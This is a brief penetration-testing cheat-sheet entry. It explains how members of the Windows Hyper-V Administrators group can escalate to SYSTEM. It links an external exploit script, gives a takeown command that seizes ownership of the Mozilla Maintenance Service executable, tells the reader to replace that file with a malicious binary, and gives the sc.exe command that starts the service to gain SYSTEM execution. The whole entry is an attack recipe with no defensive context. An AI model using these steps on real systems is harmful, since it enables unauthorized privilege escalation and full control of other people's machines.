# Hyper-V Administrators

Use this [exploit](https://raw.githubusercontent.com/decoder-it/Hyper-V-admin-EOP/master/hyperv-eop.ps1) For example with firefox: `C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe` To take ownership: `takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe`

Next, we can replace this file with a malicious maintenanceservice.exe, start the maintenance service, and get command execution as SYSTEM. `sc.exe start MozillaMaintenance`
